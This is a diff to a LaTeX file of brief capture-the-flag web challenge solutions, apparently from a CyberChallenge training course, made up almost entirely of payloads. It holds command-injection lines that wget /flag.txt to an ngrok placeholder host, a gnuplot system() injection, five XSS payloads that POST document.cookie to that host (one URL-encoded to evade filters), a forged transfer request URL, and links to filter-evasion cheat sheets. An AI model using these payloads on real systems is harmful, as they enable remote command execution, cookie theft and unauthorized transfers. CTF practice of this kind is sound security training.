@@ -1,5 +1,9 @@
 \chapter{Web Writeups}
 
+See:
+- https://gtfobins.github.io/gtfobins/zip/?utm_source=pocket_saves
+- https://cheatsheetseries.owasp.org -> https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
 \section{WS_1.01 - BasicRCE}
 \texttt{;wget$\{IFS\}https://<your-token>.ngrok-free.app/\$(cat$\{IFS\}/flag.txt)}
 
@@ -13,3 +17,23 @@ Identification: \texttt{sin(x); pause 10")} -> 10 seconds are waited before the 
 This demonstrates the system uses gnuplot (acually, wrapped with PyGnuplot).
 
 \texttt{sin(x); print system("wget https://<your-token>.ngrok-free.app/\$(cat /flag.txt)")}
+
+\section{WS_3.01 - XSS Simple 1}
+\texttt{<script> fetch('https://<your-token>.ngrok-free.app/', {method: 'POST', body: document.cookie}); </script>}
+
+\section{WS_3.02 - XSS Simple 2}
+\texttt{>"</img><script>fetch('https://<your-token>.ngrok-free.app/', {method:'POST', body:document.cookie});</script>}
+
+\section{WS_3.03 - XSS Simple 3}
+\texttt{" onerror="fetch('https://<your-token>.ngrok-free.app/', {method:'POST', body:document.cookie});"}
+
+\section{WS_3.04 - XSS Simple 4}
+\texttt{<body onload="fetch('https://<your-token>.ngrok-free.app/', {method:'POST', body:document.cookie});"> asasdf </body>}
+
+\section{WS_3.05 - XSS Simple 5}
+\texttt{\%0Afetch(\%60https\%3A\%2F\%2F<your-token>.ngrok-free.app\%60\%2C\%20\%7Bmethod\%3A\%60POST\%60\%2C\%20body\%3Adocument.cookie\%7D)\%3B\%2F\%2F}
+
+\section{WS_3.06 - Buy me a flag pls}
+\texttt{http://buyflag.challs.cyberchallenge.it/doTransfer.php?to=2136&amount=10}
+
+\section{WS_3.06 - Buy me a flag pls}
